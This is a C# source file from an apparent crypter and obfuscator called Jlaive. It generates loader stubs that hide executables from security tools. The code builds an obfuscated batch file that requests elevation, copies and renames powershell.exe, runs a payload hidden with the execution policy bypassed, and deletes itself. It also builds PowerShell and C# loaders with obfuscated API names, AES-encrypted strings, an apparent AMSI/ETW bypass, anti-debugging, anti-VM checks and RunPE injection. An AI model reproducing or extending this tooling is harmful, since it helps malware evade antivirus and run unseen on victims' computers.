using System;
using System.Text;
using BatCloak;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class StubGen
    {
        public byte[] Key { get; }
        public byte[] IV { get; }
        private Random rng { get; }

        public StubGen(byte[] key, byte[] iv, Random rng)
        {
            Key = key;
            IV = iv;
            this.rng = rng;
        }

        public string CreateBat(string pscommand, bool hidden, bool selfdelete, bool runas)
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine("@echo off");
            if (runas)
            {
                string runascode =
                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )"
                    + Environment.NewLine
                    + "cd \"%~dp0\"";
                builder.AppendLine("net file");
                builder.AppendLine(runascode);
            }
            builder.AppendLine(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ""%~0.exe""");
            builder.AppendLine("cls");
            builder.AppendLine("cd \"%~dp0\"");
            builder.AppendLine($"\"%~0.exe\" -noprofile {(hidden ? "-w hidden" : string.Empty)} -ep bypass -c {pscommand}");
            if (selfdelete) builder.AppendLine("(goto) 2>nul & del \"%~f0\"");
            builder.Append("exit /b");
            FileObfuscation obfuscator = new FileObfuscation();
            return obfuscator.Process(builder.ToString(), 3);
        }

        public string CreatePS()
        {
            string stubcode = string.Empty;
            stubcode += GetEmbeddedString("Jlaive.Resources.Stub.ps1");
            stubcode = stubcode.Replace("FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')");
            stubcode = stubcode.Replace("ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')");
            stubcode = stubcode.Replace("Load", "('daoL'[-1..-4] -join '')");
            stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(Key));
            stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(IV));
            stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
            stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
            stubcode = stubcode.Replace("line_var", RandomString(5, rng));
            stubcode = stubcode.Replace("payload_var", RandomString(5, rng));
            stubcode = stubcode.Replace("aes_var", RandomString(5, rng));
            stubcode = stubcode.Replace("decryptor_var", RandomString(5, rng));
            stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
            stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
            stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
            stubcode = stubcode.Replace("obfstep1_var", RandomString(5, rng));
            stubcode = stubcode.Replace("obfstep2_var", RandomString(5, rng));
            stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
            return stubcode;
        }

        public string CreateCS(bool antidebug, bool antivm, bool native)
        {
            string namespacename = RandomString(20, rng);
            string classname = RandomString(20, rng);
            string aesfunction = RandomString(20, rng);
            string uncompressfunction = RandomString(20, rng);
            string gerfunction = RandomString(20, rng);
            string virtualprotect = RandomString(20, rng);
            string checkremotedebugger = RandomString(20, rng);
            string isdebuggerpresent = RandomString(20, rng);

            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), Key, IV));
            string etweventwrite_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("EtwEventWrite"), Key, IV));

            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), Key, IV));
            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), Key, IV));
            string payloadtxt_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("payload.exe"), Key, IV));
            string runpedlltxt_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.dll"), Key, IV));
            string runpeclass_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.RunPE"), Key, IV));
            string runpefunction_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("ExecutePE"), Key, IV));
            string cmdcommand_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h -s \""), Key, IV));
            string key_str = Convert.ToBase64String(Key);
            string iv_str = Convert.ToBase64String(IV);

            string stub = string.Empty;
            string stubcode = GetEmbeddedString("Jlaive.Resources.Stub.cs");

            if (antidebug) stub += "#define ANTI_DEBUG\n";
            if (antivm) stub += "#define ANTI_VM\n";
            if (native) stub += "#define USE_RUNPE\n";
            stubcode = stubcode.Replace("namespace_name", namespacename);
            stubcode = stubcode.Replace("class_name", classname);
            stubcode = stubcode.Replace("aesfunction_name", aesfunction);
            stubcode = stubcode.Replace("uncompressfunction_name", uncompressfunction);
            stubcode = stubcode.Replace("getembeddedresourcefunction_name", gerfunction);
            stubcode = stubcode.Replace("virtualprotect_name", virtualprotect);
            stubcode = stubcode.Replace("checkremotedebugger_name", checkremotedebugger);
            stubcode = stubcode.Replace("isdebuggerpresent_name", isdebuggerpresent);
            stubcode = stubcode.Replace("amsiscanbuffer_str", amsiscanbuffer_str);
            stubcode = stubcode.Replace("etweventwrite_str", etweventwrite_str);
            stubcode = stubcode.Replace("checkremotedebugger_str", checkremotedebugger_str);
            stubcode = stubcode.Replace("isdebuggerpresent_str", isdebuggerpresent_str);
            stubcode = stubcode.Replace("payloadtxt_str", payloadtxt_str);
            stubcode = stubcode.Replace("runpedlltxt_str", runpedlltxt_str);
            stubcode = stubcode.Replace("runpeclass_str", runpeclass_str);
            stubcode = stubcode.Replace("runpefunction_str", runpefunction_str);
            stubcode = stubcode.Replace("cmdcommand_str", cmdcommand_str);
            stubcode = stubcode.Replace("key_str", key_str);
            stubcode = stubcode.Replace("iv_str", iv_str);
            stub += stubcode;
            return stub;
        }
    }
}